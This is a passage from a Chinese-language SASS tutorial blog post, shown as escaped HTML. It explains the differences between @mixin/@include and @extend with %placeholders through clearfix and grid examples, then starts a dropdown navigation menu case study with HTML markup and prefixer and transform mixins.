@extend</h2><p>避免代码重复生成，</p>\n<p>SASS中产生了Mixins，我们可以将相似的样式定义成一个函数模块，然后通过<code>@include</code>来调用。但很多时候，我们又不需要这么强大的功能。</p>\n<p>这个时候出现<code>@extend</code>来调用定义好相同样式的类，可没想到，这个功能是方便了，但无形中为使用者埋下了一个地雷。</p>\n<p>为了解除这个隐患，在SASS3.2中增加了一个<code>%placeholders</code>功能。让大家能很方便定义一些功能简单的相同样式模块。</p>\n<p>通过前面的介绍<code>@mixin</code>需要<code>@include</code>来调用，而<code>.class</code>和<code>%placeholders</code>需要<code>@extend</code>来调用，那么两者有何区别呢？</p>\n<ul>\n<li><code>@include</code>主要是用来调用<code>@mixin</code>定义的函数模块。在<code>@mixin</code>中可以定义一个相似功能样式，而且可以设置变量、定义参数和默认参数值；</li>\n<li><code>@extend</code>主要是用来调用<code>.class</code>或者<code>%placeholders</code>定义的属性模块；在<code>.class</code>或者<code>%placeholders</code>中可以定义一个相同样式，但这里面不能定义参数；</li>\n<li><code>@include</code>每次调用相同的<code>@mixin</code>时，编译出来的CSS相同样式不会进行合并；</li>\n<li><code>@extend</code>每次调用相同的 <code>.class</code>时，如果<code>.class</code>在样式出现多次，那么编译出来的CSS有可能不是需要的样式；</li>\n<li><code>@extend</code>每次调用相同的<code>%placeholders</code>时，编译出来的CSS相同样式会进行合并。</li>\n</ul>\n<p>下面我们通过一个清除浮动的案例，分别看看<code>@include</code>和<code>@extend</code>之间的区别：</p>\n<h3 id=\"include与-mixin使用例子\"><a href=\"#include与-mixin使用例子\" class=\"headerlink\" title=\"@include与@mixin使用例子\"></a><code>@include</code>与<code>@mixin</code>使用例子</h3><figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@<span class=\"keyword\">mixin</span> clearfix&#123;</span><br><span class=\"line\">    &amp; &#123;</span><br><span class=\"line\">      *zoom: <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    &amp;:before,</span><br><span class=\"line\">    &amp;:after &#123;</span><br><span class=\"line\">      <span class=\"attribute\">display</span>: table;</span><br><span class=\"line\">      <span class=\"attribute\">content</span>: <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    &amp;:after &#123;</span><br><span class=\"line\">      <span class=\"attribute\">clear</span>: both;</span><br><span class=\"line\">      <span class=\"attribute\">overflow</span>: hidden;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">ul</span>&#123;</span><br><span class=\"line\">  @<span class=\"keyword\">include</span> clearfix;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.block</span> &#123;</span><br><span class=\"line\">  @<span class=\"keyword\">include</span> clearfix;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>编译后：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">ul</span> &#123;</span><br><span class=\"line\">  *zoom: 1;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-tag\">ul</span><span class=\"selector-pseudo\">:before</span>, <span class=\"selector-tag\">ul</span><span class=\"selector-pseudo\">:after</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">display</span>: table;</span><br><span class=\"line\">  <span class=\"attribute\">content</span>: <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-tag\">ul</span><span class=\"selector-pseudo\">:after</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">clear</span>: both;</span><br><span class=\"line\">  <span class=\"attribute\">overflow</span>: hidden;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.block</span> &#123;</span><br><span class=\"line\">  *zoom: 1;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.block</span><span class=\"selector-pseudo\">:before</span>, <span class=\"selector-class\">.block</span><span class=\"selector-pseudo\">:after</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">display</span>: table;</span><br><span class=\"line\">  <span class=\"attribute\">content</span>: <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.block</span><span class=\"selector-pseudo\">:after</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">clear</span>: both;</span><br><span class=\"line\">  <span class=\"attribute\">overflow</span>: hidden;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>很明显，相同的样式不会进行合并。</p>\n<h3 id=\"include和-placeholders使用例子\"><a href=\"#include和-placeholders使用例子\" class=\"headerlink\" title=\"@include和%placeholders使用例子\"></a><code>@include</code>和<code>%placeholders</code>使用例子</h3><figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">%clearfix&#123;</span><br><span class=\"line\">    &amp; &#123;</span><br><span class=\"line\">      *zoom: <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    &amp;:before,</span><br><span class=\"line\">    &amp;:after &#123;</span><br><span class=\"line\">        <span class=\"attribute\">display</span>: table;</span><br><span class=\"line\">        <span class=\"attribute\">content</span>: <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    &amp;:after &#123;</span><br><span class=\"line\">        <span class=\"attribute\">clear</span>: both;</span><br><span class=\"line\">        <span class=\"attribute\">overflow</span>: hidden;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">ul</span>&#123;</span><br><span class=\"line\">  @<span class=\"keyword\">extend</span> %clearfix;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.block</span> &#123;</span><br><span class=\"line\">  @<span class=\"keyword\">extend</span> %clearfix;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>编译后：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.block</span>, <span class=\"selector-tag\">ul</span> &#123;</span><br><span class=\"line\">  *zoom: 1;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.block</span><span class=\"selector-pseudo\">:before</span>, <span class=\"selector-tag\">ul</span><span class=\"selector-pseudo\">:before</span>, <span class=\"selector-class\">.block</span><span class=\"selector-pseudo\">:after</span>, <span class=\"selector-tag\">ul</span><span class=\"selector-pseudo\">:after</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">display</span>: table;</span><br><span class=\"line\">  <span class=\"attribute\">content</span>: <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.block</span><span class=\"selector-pseudo\">:after</span>, <span class=\"selector-tag\">ul</span><span class=\"selector-pseudo\">:after</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">clear</span>: both;</span><br><span class=\"line\">  <span class=\"attribute\">overflow</span>: hidden;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>很明显相同样式代码已经进行合并。</p>\n<h3 id=\"Mixins与-placeholders的结合\"><a href=\"#Mixins与-placeholders的结合\" class=\"headerlink\" title=\"Mixins与%placeholders的结合\"></a>Mixins与%placeholders的结合</h3><p>Mixins如果使用不当，就会产生很多重复的代码，但仅用<code>@extend</code>很多时候又无法达到功能上的需求。</p>\n<p>那么有没有方法能把Mixins与<code>%placeholders</code>结合起来，取他们各自的优势呢？</p>\n<p>大家都知道,<code>%placeholders</code>就类似于CSS中的<code>.classes</code>或者<code>#ids</code>，只不过使用<code>%</code>代替了<code>.</code>和<code>#</code>。但<code>%placeholders</code>中的代码只有通过 <code>@extend</code>调用之后才会产生代码量，不然他是不会产生任何代码量。</p>\n<p>下面我们来看一个Mixins与<code>%placeholders</code>结合在一起制作的一个网格系统。</p>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">%grid &#123;</span><br><span class=\"line\">  <span class=\"attribute\">box-sizing</span>: border-box;</span><br><span class=\"line\">  <span class=\"attribute\">display</span>: inline-block;</span><br><span class=\"line\">  <span class=\"attribute\">padding-left</span>: <span class=\"number\">1em</span>;</span><br><span class=\"line\">  <span class=\"attribute\">padding-right</span>: <span class=\"number\">1em</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">@<span class=\"keyword\">mixin</span> grid(<span class=\"variable\">$width</span>: 1)&#123;</span><br><span class=\"line\">  @<span class=\"keyword\">extend</span> %grid;</span><br><span class=\"line\">  <span class=\"attribute\">width</span>: percentage(<span class=\"variable\">$width</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.grid-half</span> &#123;</span><br><span class=\"line\">  @<span class=\"keyword\">include</span> grid(<span class=\"number\">1</span> / 2);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.grid-third</span> &#123;</span><br><span class=\"line\">  @<span class=\"keyword\">include</span> grid(<span class=\"number\">1</span> / 3);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>按照这样的方法，我们可以制作出一个简单的百分比网格系统：</p>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$columns</span>: <span class=\"number\">12</span>;</span><br><span class=\"line\"><span class=\"variable\">$gutter</span>: <span class=\"number\">2em</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">%grid &#123;</span><br><span class=\"line\">  <span class=\"attribute\">box-sizing</span>: border-box;</span><br><span class=\"line\">  <span class=\"attribute\">display</span>: inline-block;</span><br><span class=\"line\">  <span class=\"attribute\">padding</span>: &#123;</span><br><span class=\"line\">    left:<span class=\"variable\">$gutter</span> / <span class=\"number\">2</span>;</span><br><span class=\"line\">    <span class=\"attribute\">right</span>:<span class=\"variable\">$gutter</span> / <span class=\"number\">2</span>;</span><br><span class=\"line\">  &#125;   </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">@<span class=\"keyword\">mixin</span> grid(<span class=\"variable\">$width</span>: 1)&#123;</span><br><span class=\"line\">  @<span class=\"keyword\">extend</span> %grid;</span><br><span class=\"line\">  <span class=\"attribute\">width</span>: percentage(<span class=\"variable\">$width</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">@<span class=\"keyword\">for</span> <span class=\"variable\">$column</span> from 1 through <span class=\"variable\">$columns</span> &#123;</span><br><span class=\"line\">  <span class=\"selector-class\">.grid-</span>#&#123;<span class=\"variable\">$column</span>&#125; &#123;</span><br><span class=\"line\">    @<span class=\"keyword\">include</span> grid(<span class=\"number\">1</span> / <span class=\"variable\">$column</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"使用Mixins和继承的细节\"><a href=\"#使用Mixins和继承的细节\" class=\"headerlink\" title=\"使用Mixins和继承的细节\"></a>使用Mixins和继承的细节</h2><p>了解了<code>@include</code>定义的<code>@mixin</code>,<code>@extend</code>定义的<code>.class</code>和<code>@extend</code>定义的<code>%placeholders</code>差异之后，我们在写SASS时，有一些细节大家应该了解：</p>\n<ul>\n<li>不要使用没有设置参数的<code>@mixin</code>，他们应该是<code>.class</code>或者<code>%placeholders</code>;</li>\n<li>不要轻意（从不使用）<code>@extend</code>调用<code>.class</code>。会得到你意想不到的结果，特别是定义的<code>.class</code>出现在嵌套或其他的样式表中，你应该使用<code>@extend</code>调用<code>%placeholders</code>;</li>\n<li>不要使用太深的选择器嵌套。</li>\n<li>如果你能避免，不要使用标签名。这不是一个taxative规则，但比id或者类名的性能要更低；</li>\n<li>不要使用子选择器符号<code>&gt;</code>，在SASS中很无效；</li>\n<li>不要使用同史选择器<code>+</code>，配合你当前的标记他是非常无效。</li>\n<li>不要太相信SASS的自动编译，你应该时时检查生成的CSS。在SASS中纠错能力比较差；</li>\n</ul>\n<h2 id=\"案例实战\"><a href=\"#案例实战\" class=\"headerlink\" title=\"案例实战\"></a>案例实战</h2><p><img src=\"/view/posts/ea50967e/%E6%A1%88%E4%BE%8B%E5%AE%9E%E6%88%98.gif\" alt=\"案例实战\"></p>\n<p>1.<code>html</code>结构</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">ul</span> <span class=\"attr\">class</span>=<span class=\"string\">\"menu\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"\"</span>&gt;</span>首页<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"\"</span>&gt;</span>博客<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">ul</span> <span class=\"attr\">class</span>=<span class=\"string\">\"drop-menu\"</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"\"</span>&gt;</span>CSS3<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"\"</span>&gt;</span>SASS<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"\"</span>&gt;</span>JavaScript<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"\"</span>&gt;</span>jQuery<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">ul</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"\"</span>&gt;</span>案例<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"\"</span>&gt;</span>资源<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"\"</span>&gt;</span>前端收藏夹<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>有了结构，我们就要开始动手了，在动手之前对这个效果先简单的分析一下：</p>\n<ul>\n<li><strong>定义变量</strong>：我要定义几个变量，方便换成别的风格；</li>\n<li><strong>清除浮动</strong>：列表使用了浮动，需要清除浮动</li>\n<li><strong>清除列表默认样式</strong>：导航是使用ul制作，所以需要清除其默认样式</li>\n<li><strong>定义transfrom</strong>：效果中使用到了CSS3的transform，使用<code>@mixin</code>定义成一个模块</li>\n<li><strong>定义transition</strong>：下拉菜单出现的时候有一个transition效果</li>\n<li><strong>定义fit-content</strong>：使用CSS3的fit-content</li>\n<li><strong>定义box-shadow</strong>：使用CSS3的box-shadow</li>\n<li><strong>定义文本</strong>：设置菜单项文本效果</li>\n</ul>\n<ol>\n<li>定义变量</li>\n</ol>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//1.定义变量</span></span><br><span class=\"line\"><span class=\"variable\">$color</span>: <span class=\"number\">#fff</span> !default; <span class=\"comment\">//设置文本颜色</span></span><br><span class=\"line\"><span class=\"variable\">$bgColor</span>: <span class=\"number\">#34495e</span> !default;<span class=\"comment\">//设置背景色</span></span><br><span class=\"line\"><span class=\"variable\">$sfbgColor</span>: <span class=\"number\">#e74c3c</span> !default;<span class=\"comment\">//设置悬浮背景色</span></span><br><span class=\"line\"><span class=\"variable\">$fontSize</span>: <span class=\"number\">14px</span> !default;<span class=\"comment\">//设置字号</span></span><br><span class=\"line\"><span class=\"variable\">$fontFamily</span>: Arial, Helvetica !default;<span class=\"comment\">//设置字体</span></span><br><span class=\"line\"><span class=\"variable\">$width</span>: <span class=\"number\">462px</span> !default; <span class=\"comment\">//设置默认宽度</span></span><br></pre></td></tr></table></figure>\n<ol start=\"2\">\n<li>清除浮动</li>\n</ol>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//2.使用%placeholders定义清除浮动</span></span><br><span class=\"line\">%clearfix &#123;</span><br><span class=\"line\">  &amp;&#123;</span><br><span class=\"line\">    *zoom: <span class=\"number\">1</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  &amp;:before,</span><br><span class=\"line\">  &amp;:after&#123;</span><br><span class=\"line\">    <span class=\"attribute\">content</span>: <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">    <span class=\"attribute\">display</span>: table;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  &amp;:after &#123;</span><br><span class=\"line\">    <span class=\"attribute\">clear</span>: both;</span><br><span class=\"line\">    <span class=\"attribute\">overflow</span>: hidden;</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n<ol start=\"3\">\n<li>清除列表默认样式</li>\n</ol>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//3.清除列表默认样式</span></span><br><span class=\"line\">%listStyle &#123;</span><br><span class=\"line\">  <span class=\"attribute\">margin</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"attribute\">padding</span>: <span class=\"number\">0</span>;    <span class=\"attribute\">list-style</span>: none outside none;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$prefix-for-webkit</span>: true !default;</span><br><span class=\"line\"><span class=\"variable\">$prefix-for-mozilla</span>: true !default;</span><br><span class=\"line\"><span class=\"variable\">$prefix-for-microsoft</span>: true !default;</span><br><span class=\"line\"><span class=\"variable\">$prefix-for-opera</span>: true !default;</span><br><span class=\"line\"><span class=\"variable\">$prefix-for-spec</span>: true !default;</span><br></pre></td></tr></table></figure>\n<ol start=\"4\">\n<li>定义transfrom</li>\n</ol>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 4.浏览器前缀</span></span><br><span class=\"line\">@<span class=\"keyword\">mixin</span> prefixer (<span class=\"variable\">$property</span>, <span class=\"variable\">$value</span>, <span class=\"variable\">$prefixes</span>) &#123;</span><br><span class=\"line\">  @<span class=\"keyword\">each</span> <span class=\"variable\">$prefix</span> in <span class=\"variable\">$prefixes</span> &#123;</span><br><span class=\"line\">    @<span class=\"keyword\">if</span> <span class=\"variable\">$prefix</span> == webkit and <span class=\"variable\">$prefix-for-webkit</span> == true &#123;</span><br><span class=\"line\">      -webkit-#&#123;<span class=\"variable\">$property</span>&#125;: <span class=\"variable\">$value</span>;</span><br><span class=\"line\">    &#125; @<span class=\"keyword\">else</span> if <span class=\"variable\">$prefix</span> == moz and <span class=\"variable\">$prefix-for-mozilla</span> == true &#123;</span><br><span class=\"line\">      -moz-#&#123;<span class=\"variable\">$property</span>&#125;: <span class=\"variable\">$value</span>;</span><br><span class=\"line\">    &#125; @<span class=\"keyword\">else</span> if <span class=\"variable\">$prefix</span> == ms and <span class=\"variable\">$prefix-for-microsoft</span> == true &#123;</span><br><span class=\"line\">      -ms-#&#123;<span class=\"variable\">$property</span>&#125;: <span class=\"variable\">$value</span>;</span><br><span class=\"line\">    &#125; @<span class=\"keyword\">else</span> if <span class=\"variable\">$prefix</span> == o and <span class=\"variable\">$prefix-for-opera</span> == true &#123;</span><br><span class=\"line\">      -o-#&#123;<span class=\"variable\">$property</span>&#125;: <span class=\"variable\">$value</span>;</span><br><span class=\"line\">    &#125; @<span class=\"keyword\">else</span> if <span class=\"variable\">$prefix</span> == spec and <span class=\"variable\">$prefix-for-spec</span> == true &#123;</span><br><span class=\"line\">      #&#123;<span class=\"variable\">$property</span>&#125;: <span class=\"variable\">$value</span>;</span><br><span class=\"line\">    &#125; @<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      @<span class=\"keyword\">warn</span> <span class=\"string\">\"Unrecognized prefix: #&#123;$prefix&#125;\"</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ol start=\"5\">\n<li>定义transition</li>\n</ol>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//5.定义transform</span></span><br><span class=\"line\"><span class=\"comment\">//示例: @include prefixer(border-radius, $radius, webkit spec);</span></span><br><span class=\"line\"><span class=\"comment\">//Transform, transform-origin, transform-style</span></span><br><span class=\"line\"><span class=\"comment\">//----------------------------------------</span></span><br><span class=\"line\">@<span class=\"keyword\">mixin</span> transform(<span class=\"variable\">$property</span>...) &#123;</span><br><span class=\"line\">  @<span class=\"keyword\">include</span> prefixer(transform, <span class=\"variable\">$property</span>, webkit moz o ms spec);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">@<span class=\"keyword\">mixin</span> transform-origin(<span class=\"variable\">$axes</span>: 50%) &#123;</span><br><span class=\"line\">  <span class=\"comment\">// x-axis - left | center | right  | length | %</span></span><br><span class=\"line\">  <span class=\"comment\">// y-axis - top  | center | bottom | length | %</span></span><br><span class=\"line\">  <span class=\"comment\">// z-axis - length</span></span><br><span class=\"line\">  @<span class=\"keyword\">include</span> prefixer(transform-origin, <span class=\"variable\">$axes</span>, webkit moz o ms spec);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">@<span class=\"keyword\">mixin</span> skewX(<span 